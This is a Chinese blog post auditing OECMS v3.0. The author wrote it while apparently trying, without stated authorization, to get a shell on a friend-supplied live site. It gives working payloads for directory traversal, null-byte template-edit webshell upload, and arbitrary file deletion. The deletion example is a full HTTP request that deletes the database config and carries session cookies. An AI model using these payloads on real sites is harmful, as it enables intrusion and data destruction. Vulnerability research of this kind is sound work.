---
title: "Oecms v3 Audit"
date: 2019-04-15T13:06:38+08:00
draft: false
tags: ['audit']
categories: ['代码审计']
---

实战中碰到了这个cms，审计一波，记录一下

<!--more-->

@ershiyi发我一个网站，让我拿shell，看了下是oecmsv3.0的源码，并且二次开发过。有后台的账号和密码，关键在于怎么getshell，所以sql注入的点我没看。以下是审计结果。

## 后台登陆爆破

`http://go.go/admin/login.php`

![](https://y4er.com/img/uploads/20190509166907.jpg)

产生原因：

`oecms\data\include\imagecode.php`生成验证码后存入session

```php
while(($randval=rand()%100000)<10000);{
        $_SESSION["verifycode"] = $randval;
        //将四位整数验证码绘入图片 
        imagestring($im, 5, 10, 3, $randval, $black);
    }
```

`oecms\admin\login.php`进行验证码比对后并没有及时刷新session

```php
if($checkcode != $_SESSION["verifycode"]){
			$founderr	= true;
			$errmsg	   .= "验证码不正确.<br />";
		}
```

## 后台文件遍历

`E:\WWW\oecms\admin\oecms_template.php`

```php
function volist(){
	Core_Auth::checkauth("templatevolsit");
	global $dir,$tpl;
	if(!Core_Fun::ischar($dir)){
		$dir = "tpl";
	}

	if(substr($dir,0,3)!="tpl"){
		Core_Fun::halt("对不起，模板管理只允许读取“tpl”目录下的文件！","",1);
	}
.
.
.
	$tpl->assign("dirpath",$dirpath);
	$tpl->assign("dir",$dir);
	$tpl->assign("template",$template);
}
```

限制`$dir`的前三个字符是`tpl`，可以用`http://go.go/admin/oecms_template.php?dir=tpl/../`绕过

![](https://y4er.com/img/uploads/20190509167792.jpg)

## 编辑模板getshell

`E:\WWW\oecms\admin\oecms_template.php`

```php
/* 扩展名 */
	$allow_exts = "tpl|html|htm|js|css";
	$array_file = explode(".",$urlstrs);
	$array_count = count($array_file);
	$file_ext = $array_file[$array_count-1];
	if(!Core_Fun::foundinarr($allow_exts,strtolower($file_ext),"|")){
		Core_Fun::halt("对不起，只允许修改后缀为.tpl,.html,.htm,.js和.css的文件！","",1);
	}
```

限制文件名后缀，考虑到这个cms比较老，目标站点是php5.3的环境，可以用`%00`绕过

payload:`/admin/oecms_template.php?action=edit&urlstrs=tpl/..//case.php%00.tpl`

在这边需要注意的是保存的时候也需要进行`%00`截断，并且编辑的文件需要是存在的php文件，否则无法getshell

因为在153行

```php
/* 检测文件 */
	if(!is_writeable("../".$urlstrs)){
		Core_Fun::halt("对不起，该文件没有修改的权限！请设置tpl目录权限后再试！","",1);
	}else{
		$handle = fopen("../".$urlstrs,"wb");
		if(!$handle){
			Core_Fun::halt("对不起，不能打开该文件！","",1);
		}else{
			if(@fwrite($handle,$content)===FALSE){
				Core_Fun::halt("对不起，文件修改失败，请检查该文件是否使用中！","",1);
			}else{
				Core_Command::runlog("","编辑文件成功[".$urlstrs."]",1);
				Core_Fun::halt("模板文件修改成功","oecms_template.php?dir=".urlencode(substr($filepath,0,(strlen($filepath)-1)))."",0);
			}
		}
		fclose($handle);
```

首先检查了文件是否可用，如果是不存在的文件，则返回`对不起`

## 任意文件删除

payload

```php
GET /admin/upload.php?action=del&comeform=myform&picfolder=&inputid=uploadfiles&thumbinput=thumbfiles&channel=product&thumbflag=1&thumbwidth=0&thumbheight=0&waterflag=1&picname=2c6e34c9bfd7a0b71ba157f17cc9666b.jpg&picurl=source/conf/db.inc.php HTTP/1.1
Host: go.go
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://go.go/admin/upload.php?action=show&comeform=myform&inputid=uploadfiles&thumbflag=1&thumbinput=thumbfiles&channel=product&waterflag=1&picname=2c6e34c9bfd7a0b71ba157f17cc9666b.jpg&picurl=data/attachment/201108/27/2c6e34c9bfd7a0b71ba157f17cc9666b.jpg
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: set_options=set01; yc7gv1sgapp_admininfo=27a9gBgBf3Nb4JZymeKzxzYAdfCau0p%2BKLHiFMQlKfHjg2vmJsuI%2B%2FbtehcrXGXAGPmT%2F9Tq6C5VvUkF1NVu9Gqth2vIf9elrseicrYUkz9KTiA; PHPSESSID=ae2da05952aff79b9f9f86466915b033; 7ZnF6tLU_ADMINNAME=admin; 7ZnF6tLU_ADMINPASSWORD=21232f297a57a5a743894a0e4a801fc3
Connection: close


```

修改`picurl`参数删除任意文件，payload中是删除数据库配置文件，慎用。删除`config.inc.php`后会导致重装

`admin/upload.php`103行

```php
function del(){
	Core_Fun::deletefile("../".$GLOBALS['picurl']);
	echo("<script language='javascript'>window.location.href='upload.php?action=&".$GLOBALS['comeurl']."';</script>");
}
```

跟踪`deletefile()`函数

```php
	public static function deletefile($s_filename){
		if(!self::ischar($s_filename)){
			return;
		}
		@unlink($s_filename);
	}
```

没有判断文件路径，导致任意文件删除。

## 后台文件黑名单上传

`http://go.go/admin/annexform.php?comeform=myform&inputname=uploadfiles`

黑名单`asp|aspx|asax|asa|jsp|cer|cdx|asa|htr|php|php3|cgi|html|htm|shtml`

可根据具体环境截断或者用其他可解析后缀来上传shell，在这里不细说。

## 后话

最后目标站也没拿下来，编辑模板报500，nginx上传截断无果